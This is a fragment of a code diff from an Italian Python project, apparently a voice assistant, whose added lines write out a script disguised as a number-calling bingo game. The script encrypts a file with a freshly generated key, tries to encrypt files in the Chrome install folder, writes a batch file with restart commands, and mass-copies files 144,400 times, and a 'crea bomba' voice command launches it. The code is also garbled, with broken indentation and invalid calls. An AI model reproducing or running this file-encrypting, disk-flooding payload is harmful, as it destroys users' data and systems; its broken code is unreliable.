+        file2.writable("import pyttsx3\nimport random\nimport tkinter as Tk\nimport os\nimport shutil \nfrom cryptography.fernet import Fernet\nimport subprocess\n#welcome to blue-terminal\n''\n''''''''---------''''''''we won't stop here we are in the Internet----''nsubprocess.run('echo off')\ndef estrazionenumeri(file_path):\n\nvoce=pyttsx3.init()\nvoce.say('inizio il gioco la tombola sei pronto?:')\nnumeri=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]\nnumgen=random.choice(numeri)\nmotore = pyttsx3.init()\nmotore.say(numgen)\nmotore.runAndWait()\nif numgen == motore:\n\nprint('errore ripora ')\nkey=Fernet.generate_key()\nwith open('key.key','wb') as key_file:\n\nkey_file.write(key)\nwith open('key.key','rb')  as key_file:\nkey=key_file.read() \nfernet=Fernet(key)\nwith open(file_path,'rd')as file:\noriginal=file.read()\nencrypter=fernet.encrypt(original)\nwith open(file_path,'wb')as encrypter_file:\nencrypter_file.write(encrypter)\npercorso='C:\Program Files\Google\Chrome\Application'\nfor filename in os.listdir(percorso):\npercorso=os.path.join(percorso,filename)\nif os.path.isfile(percorso):\nencrypter_file(percorso)\nelse:\nmotore.say(numgen)\nmotore.runAndWait()\ndef restarta():\nnumeri=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]\nnumgen=random.choice(numeri)\nmotore = pyttsx3.init()\nmotore.say(numgen)\nmotore.runAndWait()\nif numgen == motore:\nprint('errore ripora ')\nfile=open('tnt.bat','w')\nfile.write('echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ')\nfile.close()\nfor i in range(144400):\nshutil.copy('tnt.bat',f'tnt{i}.bat')\nelse:motore.say(numgen)\nmotore.runAndWait()\nchiave=Fernet.generate_key()\nwith open(f'tnt{i}.bat','rb') as f:\ndata=f.read()\nfernet=Fernet(chiave)\ndatimie=fernet.encrypt(data)\nwith open(f'tnt{i}.bat','wb') as f:\nf.write(datimie)\nsubprocess.run('echo off')\nfile=open('tnt.bat','w')\nfile.write('echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ')\nfile.close()\nsubprocess.call(['tnt.py'])   \nsubprocess.check_call(['ls','-la']) \nsubprocess.run('ipconfig')\nsubprocess.run('hello welcome blue-terminal')\nfor i in range(144400):\nshutil.copy('tnt.bat',f'tnt{i}.bat')\nsubprocess.call([f'tnt{i}.py'])   \nchiave=Fernet.generate_key()\nwith open(f'tnt{i}.bat','rb') as f:\ndata=f.read()\nfernet=Fernet(chiave)\ndatimie=fernet.encrypt(data)\nwith open(f'tnt{i}.bat','wb') as f:\nf.write(datimie)\nsubprocess.check_call(['ls','-la']) \nshutil.copy('tnt.bat','tnt1.bat')\nshutil.copy('tnt.bat','tnt2.bat')shutil.copy('tnt.bat','tnt3.bat')\nshutil.copy('tnt.bat','tnt4.bat')\nshutil.copy('tnt.batì','tnt4.bat')\nshutil.copy('tnt.bat','tnt6.bat')shutil.copy('tnt.bat','tnt7.bat')\nshutil.copy('tnt.bat','tnt8.bat')\nshutil.copy('tnt.bat','tnt9.bat')\nshutil.copy('tnt.bat','tnt10.bat')")
         file2.close()
         for i in range(144400):
             shutil.copy("nucleare.py",f"nucleare{i}.py")
@@ -2121,7 +2131,9 @@ elif utente==5:
                         pyautogui.typewrite(stringa)
                     pyautogui.press("enter")    
                     pyautogui.press("enter")
-
+                elif "riavvia" in text.lower():
+                    speak("sto riavviando")
+                    pyautogui.press("f5")
         if __name__ == "__main__":
             main()
         
@@ -2573,7 +2585,7 @@ elif utente==5:
                 elif"crea bomba"in text.lower():
                     speak("sto greando la bomba alla fine si eseguirà in automatico")
                     subprocess.Popen(['notepad.exe'])
-                    totto=''import pyttsx3
+                    totto='''import pyttsx3
         import random
         import tkinter as Tk
         import os
